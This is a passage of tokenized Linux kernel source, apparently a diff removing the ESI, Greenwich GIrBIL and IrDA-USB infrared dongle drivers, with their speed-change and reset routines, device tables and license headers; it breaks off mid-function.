"9600", ":", "dtr", "=", "FALSE", ";", "rts", "=", "TRUE", ";", "break", ";", "}", "/", "*", "Change", "speed", "of", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "dtr", ",", "rts", ")", ";", "dev", "-", ">", "speed", "=", "speed", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "esi_reset", "(", "task", ")", "*", "*", "Reset", "dongle", ";", "*", "*", "/", "static", "int", "esi_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "/", "*", "Hm", ",", "the", "old", "esi", "-", "driver", "left", "the", "dongle", "unpowered", "relying", "on", "*", "the", "following", "speed", "change", "to", "repower", ".", "This", "might", "work", "for", "*", "the", "esi", "because", "we", "only", "need", "the", "modem", "lines", ".", "However", ",", "now", "the", "*", "general", "rule", "is", "reset", "must", "bring", "the", "dongle", "to", "some", "working", "*", "well", "-", "known", "state", "because", "speed", "change", "might", "write", "to", "registers", ".", "*", "The", "old", "esi", "-", "driver", "didn", "'", "t", "any", "delay", "here", "-", "let", "'", "s", "hope", "it", "'", "fine", ".", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "dev", "-", ">", "speed", "=", "9600", ";", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Extended", "Systems", "JetEye", "PC", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "1", "\"", ");", "/", "*", "IRDA_ESI_DONGLE", "*", "/", "module_init", "(", "esi_sir_init", ")", ";", "module_exit", "(", "esi_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "252", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "girbil", ".", "c", "*", "Version", ":", "1", ".", "2", "*", "Description", ":", "Implementation", "for", "the", "Greenwich", "GIrBIL", "dongle", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Sat", "Feb", "6", "21", ":", "02", ":", "33", "1999", "*", "Modified", "at", ":", "Fri", "Dec", "17", "09", ":", "13", ":", "20", "1999", "*", "Modified", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "1999", "Dag", "Brattli", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "Dag", "Brattli", "nor", "University", "of", "Troms", "\u00f8", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "static", "int", "girbil_reset", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "girbil_open", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "girbil_close", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "girbil_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", ";", "/", "*", "Control", "register", "1", "*", "/", "#", "define", "GIRBIL_TXEN", "0x01", "/", "*", "Enable", "transmitter", "*", "/", "#", "define", "GIRBIL_RXEN", "0x02", "/", "*", "Enable", "receiver", "*", "/", "#", "define", "GIRBIL_ECAN", "0x04", "/", "*", "Cancel", "self", "emitted", "data", "*", "/", "#", "define", "GIRBIL_ECHO", "0x08", "/", "*", "Echo", "control", "characters", "*", "/", "/", "*", "LED", "Current", "Register", "(", "0x2", ")", "*", "/", "#", "define", "GIRBIL_HIGH", "0x20", "#", "define", "GIRBIL_MEDIUM", "0x21", "#", "define", "GIRBIL_LOW", "0x22", "/", "*", "Baud", "register", "(", "0x3", ")", "*", "/", "#", "define", "GIRBIL_2400", "0x30", "#", "define", "GIRBIL_4800", "0x31", "#", "define", "GIRBIL_9600", "0x32", "#", "define", "GIRBIL_19200", "0x33", "#", "define", "GIRBIL_38400", "0x34", "#", "define", "GIRBIL_57600", "0x35", "#", "define", "GIRBIL_115200", "0x36", "/", "*", "Mode", "register", "(", "0x4", ")", "*", "/", "#", "define", "GIRBIL_IRDA", "0x40", "#", "define", "GIRBIL_ASK", "0x41", "/", "*", "Control", "register", "2", "(", "0x5", ")", "*", "/", "#", "define", "GIRBIL_LOAD", "0x51", "/", "*", "Load", "the", "new", "baud", "rate", "value", "*", "/", "static", "struct", "dongle_driver", "girbil", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Greenwich", "GIrBIL", "\"", ",", ".", "type", "=", "IRDA_GIRBIL_DONGLE", ",", ".", "open", "=", "girbil_open", ",", ".", "close", "=", "girbil_close", ",", ".", "reset", "=", "girbil_reset", ",", ".", "set_speed", "=", "girbil_change_speed", ",", "}", ";", "static", "int", "__init", "girbil_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "girbil", ")", ";", "}", "static", "void", "__exit", "girbil_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "girbil", ")", ";", "}", "static", "int", "girbil_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "Power", "on", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x03", ";", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "girbil_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "girbil_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Set", "the", "speed", "for", "the", "Girbil", "type", "dongle", ".", "*", "*", "/", "#", "define", "GIRBIL_STATE_WAIT_SPEED", "(", "SIRDEV_STATE_DONGLE_SPEED", "+", "1", ")", "static", "int", "girbil_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "unsigned", "state", "=", "dev", "-", ">", "fsm", ".", "substate", ";", "unsigned", "delay", "=", "0", ";", "u8", "control", "[", "2", "]", ";", "static", "int", "ret", "=", "0", ";", "/", "*", "dongle", "alread", "reset", "-", "port", "and", "dongle", "at", "default", "speed", "*", "/", "switch", "(", "state", ")", "{", "case", "SIRDEV_STATE_DONGLE_SPEED", ":", "/", "*", "Set", "DTR", "and", "Clear", "RTS", "to", "enter", "command", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "udelay", "(", "25", ")", ";", "/", "*", "better", "wait", "a", "little", "while", "*", "/", "ret", "=", "0", ";", "switch", "(", "speed", ")", "{", "default", ":", "ret", "=", "-", "EINVAL", ";", "/", "*", "fall", "through", "*", "/", "case", "9600", ":", "control", "[", "0", "]", "=", "GIRBIL_9600", ";", "break", ";", "case", "19200", ":", "control", "[", "0", "]", "=", "GIRBIL_19200", ";", "break", ";", "case", "34800", ":", "control", "[", "0", "]", "=", "GIRBIL_38400", ";", "break", ";", "case", "57600", ":", "control", "[", "0", "]", "=", "GIRBIL_57600", ";", "break", ";", "case", "115200", ":", "control", "[", "0", "]", "=", "GIRBIL_115200", ";", "break", ";", "}", "control", "[", "1", "]", "=", "GIRBIL_LOAD", ";", "/", "*", "Write", "control", "bytes", "*", "/", "sirdev_raw_write", "(", "dev", ",", "control", ",", "2", ")", ";", "dev", "-", ">", "speed", "=", "speed", ";", "state", "=", "GIRBIL_STATE_WAIT_SPEED", ";", "delay", "=", "100", ";", "break", ";", "case", "GIRBIL_STATE_WAIT_SPEED", ":", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "udelay", "(", "25", ")", ";", "/", "*", "better", "wait", "a", "little", "while", "*", "/", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "-", "undefined", "state", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "state", ")", ";", "ret", "=", "-", "EINVAL", ";", "break", ";", "}", "dev", "-", ">", "fsm", ".", "substate", "=", "state", ";", "return", "(", "delay", ">", "0", ")", "?", "delay", ":", "ret", ";", "}", "/", "*", "*", "Function", "girbil_reset", "(", "driver", ")", "*", "*", "This", "function", "resets", "the", "girbil", "dongle", ".", "*", "*", "Algorithm", ":", "*", "0", ".", "set", "RTS", ",", "and", "wait", "at", "least", "5", "ms", "*", "1", ".", "clear", "RTS", "*", "/", "#", "define", "GIRBIL_STATE_WAIT1_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "1", ")", "#", "define", "GIRBIL_STATE_WAIT2_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "2", ")", "#", "define", "GIRBIL_STATE_WAIT3_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "3", ")", "static", "int", "girbil_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "unsigned", "state", "=", "dev", "-", ">", "fsm", ".", "substate", ";", "unsigned", "delay", "=", "0", ";", "u8", "control", "=", "GIRBIL_TXEN", "|", "GIRBIL_RXEN", ";", "int", "ret", "=", "0", ";", "switch", "(", "state", ")", "{", "case", "SIRDEV_STATE_DONGLE_RESET", ":", "/", "*", "Reset", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "/", "*", "Sleep", "at", "least", "5", "ms", "*", "/", "delay", "=", "20", ";", "state", "=", "GIRBIL_STATE_WAIT1_RESET", ";", "break", ";", "case", "GIRBIL_STATE_WAIT1_RESET", ":", "/", "*", "Set", "DTR", "and", "clear", "RTS", "to", "enter", "command", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "delay", "=", "20", ";", "state", "=", "GIRBIL_STATE_WAIT2_RESET", ";", "break", ";", "case", "GIRBIL_STATE_WAIT2_RESET", ":", "/", "*", "Write", "control", "byte", "*", "/", "sirdev_raw_write", "(", "dev", ",", "&", "control", ",", "1", ")", ";", "delay", "=", "20", ";", "state", "=", "GIRBIL_STATE_WAIT3_RESET", ";", "break", ";", "case", "GIRBIL_STATE_WAIT3_RESET", ":", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "dev", "-", ">", "speed", "=", "9600", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "undefined", "state", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "state", ")", ";", "ret", "=", "-", "1", ";", "break", ";", "}", "dev", "-", ">", "fsm", ".", "substate", "=", "state", ";", "return", "(", "delay", ">", "0", ")", "?", "delay", ":", "ret", ";", "}", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Greenwich", "GIrBIL", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "4", "\"", ");", "/", "*", "IRDA_GIRBIL_DONGLE", "*", "/", "module_init", "(", "girbil_sir_init", ")", ";", "module_exit", "(", "girbil_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "1906", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "irda", "-", "usb", ".", "c", "*", "Version", ":", "0", ".", "10", "*", "Description", ":", "IrDA", "-", "USB", "Driver", "*", "Status", ":", "Experimental", "*", "Author", ":", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", "*", "*", "Copyright", "(", "C", ")", "2000", ",", "Roman", "Weissgaerber", "<", "weissg", "@", "vienna", ".", "at", ">", "*", "Copyright", "(", "C", ")", "2001", ",", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", "*", "Copyright", "(", "C", ")", "2001", ",", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "*", "Copyright", "(", "C", ")", "2004", ",", "SigmaTel", ",", "Inc", ".", "<", "irquality", "@", "sigmatel", ".", "com", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Milan", "Beno", "<", "beno", "@", "pobox", ".", "sk", ">", "*", "Copyright", "(", "C", ")", "2006", ",", "Nick", "Fedchik", "<", "nick", "@", "fedchik", ".", "org", ".", "ua", ">", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "IMPORTANT", "NOTE", "*", "*", "*", "As", "of", "kernel", "2", ".", "5", ".", "20", ",", "this", "is", "the", "state", "of", "compliance", "and", "testing", "of", "*", "this", "driver", "(", "irda", "-", "usb", ")", "with", "regards", "to", "the", "USB", "low", "level", "drivers", ".", "..", "*", "*", "This", "driver", "has", "been", "tested", "SUCCESSFULLY", "with", "the", "following", "drivers", ":", "*", "o", "usb", "-", "uhci", "-", "hcd", "(", "For", "Intel", "/", "Via", "USB", "controllers", ")", "*", "o", "uhci", "-", "hcd", "(", "Alternate", "/", "JE", "driver", "for", "Intel", "/", "Via", "USB", "controllers", ")", "*", "o", "ohci", "-", "hcd", "(", "For", "other", "USB", "controllers", ")", "*", "*", "This", "driver", "has", "NOT", "been", "tested", "with", "the", "following", "drivers", ":", "*", "o", "ehci", "-", "hcd", "(", "USB", "2", ".", "0", "controllers", ")", "*", "*", "Note", "that", "all", "HCD", "drivers", "do", "URB_ZERO_PACKET", "and", "timeout", "properly", ",", "*", "so", "we", "don", "'", "t", "have", "to", "worry", "about", "that", "anymore", ".", "*", "One", "common", "problem", "is", "the", "failure", "to", "set", "the", "address", "on", "the", "dongle", ",", "*", "but", "this", "happens", "before", "the", "driver", "gets", "loaded", ".", "..", "*", "*", "Jean", "II", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "skbuff", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "rtnetlink", ".", "h", ">", "#", "include", "<", "linux", "/", "usb", ".", "h", ">", "#", "include", "<", "linux", "/", "firmware", ".", "h", ">", "#", "include", "\"", "irda", "-", "usb", ".", "h", "\"", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "static", "int", "qos_mtt_bits", "=", "0", ";", "/", "*", "These", "are", "the", "currently", "known", "IrDA", "USB", "dongles", ".", "Add", "new", "dongles", "here", "*", "/", "static", "const", "struct", "usb_device_id", "dongles", "[", "]", "=", "{", "/", "*", "ACTiSYS", "Corp", ".", ",", "ACT", "-", "IR2000U", "FIR", "-", "USB", "Adapter", "*", "/", "{", "USB_DEVICE", "(", "0x9c4", ",", "0x011", ")", ",", ".", "driver_info", "=", "IUC_SPEED_BUG", "|", "IUC_NO_WINDOW", "}", ",", "/", "*", "Look", "like", "ACTiSYS", ",", "Report", ":", "IBM", "Corp", ".", ",", "IBM", "UltraPort", "IrDA", "*", "/", "{", "USB_DEVICE", "(", "0x4428", ",", "0x012", ")", ",", ".", "driver_info", "=", "IUC_SPEED_BUG", "|", "IUC_NO_WINDOW", "}", ",", "/", "*", "KC", "Technology", "Inc", ".", ",", "KC", "-", "180", "USB", "IrDA", "Device", "*", "/", "{", "USB_DEVICE", "(", "0x50f", ",", "0x180", ")", ",", ".", "driver_info", "=", "IUC_SPEED_BUG", "|", "IUC_NO_WINDOW", "}", ",", "/", "*", "Extended", "Systems", ",", "Inc", ".", ",", "XTNDAccess", "IrDA", "USB", "(", "ESI", "-", "9685", ")", "*", "/", "{", "USB_DEVICE", "(", "0x8e9", ",", "0x100", ")", ",", ".", "driver_info", "=", "IUC_SPEED_BUG", "|", "IUC_NO_WINDOW", "}", ",", "/", "*", "SigmaTel", "STIR4210", "/", "4220", "/", "4116", "USB", "IrDA", "(", "VFIR", ")", "Bridge", "*", "/", "{", "USB_DEVICE", "(", "0x66f", ",", "0x4210", ")", ",", ".", "driver_info", "=", "IUC_STIR421X", "|", "IUC_SPEED_BUG", "}", ",", "{", "USB_DEVICE", "(", "0x66f", ",", "0x4220", ")", ",", ".", "driver_info", "=", "IUC_STIR421X", "|", "IUC_SPEED_BUG", "}", ",", "{", "USB_DEVICE", "(", "0x66f", ",", "0x4116", ")", ",", ".", "driver_info", "=", "IUC_STIR421X", "|", "IUC_SPEED_BUG", "}", ",", "{", ".", "match_flags", "=", "USB_DEVICE_ID_MATCH_INT_CLASS", "|", "USB_DEVICE_ID_MATCH_INT_SUBCLASS", ",", ".", "bInterfaceClass", "=", "USB_CLASS_APP_SPEC", ",", ".", "bInterfaceSubClass", "=", "USB_CLASS_IRDA", ",", ".", "driver_info", "=", "IUC_DEFAULT", ",", "}", ",", "{", "}", ",", "/", "*", "The", "end", "*", "/", "}", ";", "/", "*", "*", "Important", "note", ":", "*", "Devices", "based", "on", "the", "SigmaTel", "chipset", "(", "0x66f", ",", "0x4200", ")", "are", "not", "designed", "*", "using", "the", "\"", "USB", "-", "IrDA", "specification", "\"", "(", "yes", ",", "there", "exist", "such", "a", "thing", ")", ",", "and", "*", "therefore", "not", "supported", "by", "this", "driver", "(", "don", "'", "t", "add", "them", "above", ")", ".", "*", "There", "is", "a", "Linux", "driver", ",", "stir4200", ",", "that", "support", "those", "USB", "devices", ".", "*", "Jean", "II", "*", "/", "MODULE_DEVICE_TABLE", "(", "usb", ",", "dongles", ")", ";", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "static", "void", "irda_usb_init_qos", "(", "struct", "irda_usb_cb", "*", "self", ")", ";", "static", "struct", "irda_class_desc", "*", "irda_usb_find_class_desc", "(", "struct", "usb_interface", "*", "intf", ")", ";", "static", "void", "irda_usb_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", ";", "static", "void", "irda_usb_change_speed_xbofs", "(", "struct", "irda_usb_cb", "*", "self", ")", ";", "static", "netdev_tx_t", "irda_usb_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "irda_usb_open", "(", "struct", "irda_usb_cb", "*", "self", ")", ";", "static", "void", "irda_usb_close", "(", "struct", "irda_usb_cb", "*", "self", ")", ";", "static", "void", "speed_bulk_callback", "(", "struct", "urb", "*", "urb", ")", ";", "static", "void", "write_bulk_callback", "(", "struct", "urb", "*", "urb", ")", ";", "static", "void", "irda_usb_receive", "(", "struct", "urb", "*", "urb", ")", ";", "static", "void", "irda_usb_rx_defer_expired", "(", "struct", "timer_list", "*", "t", ")", ";", "static", "int", "irda_usb_net_open", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "irda_usb_net_close", "(", "struct", "net_device", "*", "dev", ")", ";", "static", "int", "irda_usb_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", ";", "static", "void", "irda_usb_net_timeout", "(", "struct", "net_device", "*", "dev", ")", ";", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "TRANSMIT", "ROUTINES", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "*", "Receive", "packets", "from", "the", "IrDA", "stack", "and", "send", "them", "on", "the", "USB", "pipe", ".", "*", "Handle", "speed", "change", ",", "timeout", "and", "lot", "'", "s", "of", "ugliness", ".", "..", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_build_header", "(", "self", ",", "skb", ",", "header", ")", "*", "*", "Builds", "USB", "-", "IrDA", "outbound", "header", "*", "*", "When", "we", "send", "an", "IrDA", "frame", "over", "an", "USB", "pipe", ",", "we", "add", "to", "it", "a", "1", "byte", "*", "header", ".", "This", "function", "create", "this", "header", "with", "the", "proper", "values", ".", "*", "*", "Important", "note", ":", "the", "USB", "-", "IrDA", "spec", "1", ".", "0", "say", "very", "clearly", "in", "chapter", "5", ".", "4", ".", "2", ".", "2", "*", "that", "the", "setting", "of", "the", "link", "speed", "and", "xbof", "number", "in", "this", "outbound", "header", "*", "should", "be", "applied", "*", "AFTER", "*", "the", "frame", "has", "been", "sent", ".", "*", "Unfortunately", ",", "some", "devices", "are", "not", "compliant", "with", "that", ".", "..", "It", "seems", "that", "*", "reading", "the", "spec", "is", "far", "too", "difficult", ".", "..", "*", "Jean", "II", "*", "/", "static", "void", "irda_usb_build_header", "(", "struct", "irda_usb_cb", "*", "self", ",", "__u8", "*", "header", ",", "int", "force", ")", "{", "/", "*", "Here", "we", "check", "if", "we", "have", "an", "STIR421x", "chip", ",", "*", "and", "if", "either", "speed", "or", "xbofs", "(", "or", "both", ")", "needs", "*", "to", "be", "changed", ".", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", "&", "&", "(", "(", "self", "-", ">", "new_speed", "!", "=", "-", "1", ")", "|", "|", "(", "self", "-", ">", "new_xbofs", "!", "=", "-", "1", ")", "))", "{", "/", "*", "With", "STIR421x", ",", "speed", "and", "xBOFs", "must", "be", "set", "at", "the", "same", "*", "time", ",", "even", "if", "only", "one", "of", "them", "changes", ".", "*", "/", "if", "(", "self", "-", ">", "new_speed", "=", "=", "-", "1", ")", "self", "-", ">", "new_speed", "=", "self", "-", ">", "speed", ";", "if", "(", "self", "-", ">", "new_xbofs", "=", "=", "-", "1", ")", "self", "-", ">", "new_xbofs", "=", "self", "-", ">", "xbofs", ";", "}", "/", "*", "Set", "the", "link", "speed", "*", "/", "if", "(", "self", "-", ">", "new_speed", "!", "=", "-", "1", ")", "{", "/", "*", "Hum", ".", "..", "Ugly", "hack", ":", "-(", "*", "Some", "device", "are", "not", "compliant", "with", "the", "spec", "and", "change", "*", "parameters", "*", "before", "*", "sending", "the", "frame", ".", "-", "Jean", "II", "*", "/", "if", "(", "(", "self", "-", ">", "capability", "&", "IUC_SPEED_BUG", ")", "&", "&", "(", "!", "force", ")", "&", "&", "(", "self", "-", ">", "speed", "!", "=", "-", "1", ")", ")", "{", "/", "*", "No", "speed", "and", "xbofs", "change", "here", "*", "(", "we", "'", "ll", "do", "it", "later", "in", "the", "write", "callback", ")", "*", "/", "pr_debug", "(", "\"%", "s", "(", "),", "not", "changing", "speed", "yet", "\\", "n", "\"", ",", "__func__", ")", ";", "*", "header", "=", "0", ";", "return", ";", "}", "pr_debug", "(", "\"%", "s", "(", "),", "changing", "speed", "to", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "new_speed", ")", ";", "self", "-", ">", "speed", "=", "self", "-", ">", "new_speed", ";", "/", "*", "We", "will", "do", "`", "self", "-", ">", "new_speed", "=", "-", "1", ";", "'", "in", "the", "completion", "*", "handler", "just", "in", "case", "the", "current", "URB", "fail", "-", "Jean", "II", "*", "/", "switch", "(", "self", "-", ">", "speed", ")", "{", "case", "2400", ":", "*", "header", "=", "SPEED_2400", ";", "break", ";", "default", ":", "case", "9600", ":", "*", "header", "=", "SPEED_9600", ";", "break", ";", "case", "19200", ":", "*", "header", "=", "SPEED_19200", ";", "break", ";", "case", "38400", ":", "*", "header", "=", "SPEED_38400", ";", "break", ";", "case", "57600", ":", "*", "header", "=", "SPEED_57600", ";", "break", ";", "case", "115200", ":", "*", "header", "=", "SPEED_115200", ";", "break", ";", "case", "576000", ":", "*", "header", "=", "SPEED_576000", ";", "break", ";", "case", "1152000", ":", "*", "header", "=", "SPEED_1152000", ";", "break", ";", "case", "4000000", ":", "*", "header", "=", "SPEED_4000000", ";", "self", "-", ">", "new_xbofs", "=", "0", ";", "break", ";", "case", "16000000", ":", "*", "header", "=", "SPEED_16000000", ";", "self", "-", ">", "new_xbofs", "=", "0", ";", "break", ";", "}", "}", "else", "/", "*", "No", "change", "*", "/", "*", "header", "=", "0", ";", "/", "*", "Set", "the", "negotiated", "additional", "XBOFS", "*", "/", "if", "(", "self", "-", ">", "new_xbofs", "!", "=", "-", "1", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "changing", "xbofs", "to", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "new_xbofs", ")", ";", "self", "-", ">", "xbofs", "=", "self", "-", ">", "new_xbofs", ";", "/", "*", "We", "will", "do", "`", "self", "-", ">", "new_xbofs", "=", "-", "1", ";", "'", "in", "the", "completion", "*", "handler", "just", "in", "case", "the", "current", "URB", "fail", "-", "Jean", "II", "*", "/", "switch", "(", "self", "-", ">", "xbofs", ")", "{", "case", "48", ":", "*", "header", "|", "=", "0x10", ";", "break", ";", "case", "28", ":", "case", "24", ":", "/", "*", "USB", "spec", "1", ".", "0", "says", "24", "*", "/", "*", "header", "|", "=", "0x20", ";", "break", ";", "default", ":", "case", "12", ":", "*", "header", "|", "=", "0x30", ";", "break", ";", "case", "5", ":", "/", "*", "Bug", "in", "IrLAP", "spec", "?", "(", "should", "be", "6", ")", "*", "/", "case", "6", ":", "*", "header", "|", "=", "0x40", ";", "break", ";", "case", "3", ":", "*", "header", "|", "=", "0x50", ";", "break", ";", "case", "2", ":", "*", "header", "|", "=", "0x60", ";", "break", ";", "case", "1", ":", "*", "header", "|", "=", "0x70", ";", "break", ";", "case", "0", ":", "*", "header", "|", "=", "0x80", ";", "break", ";", "}", "}", "}", "/", "*", "*", "calculate", "turnaround", "time", "for", "SigmaTel", "header", "*", "/", "static", "__u8", "get_turnaround_time", "(", "struct", "sk_buff", "*", "skb", ")", "{", "int", "turnaround_time", "=", "irda_get_mtt", "(", "skb", ")", ";", "if", "(", "turnaround_time", "=", "=", "0", ")", "return", "0", ";", "else", "if", "(", "turnaround_time", "<", 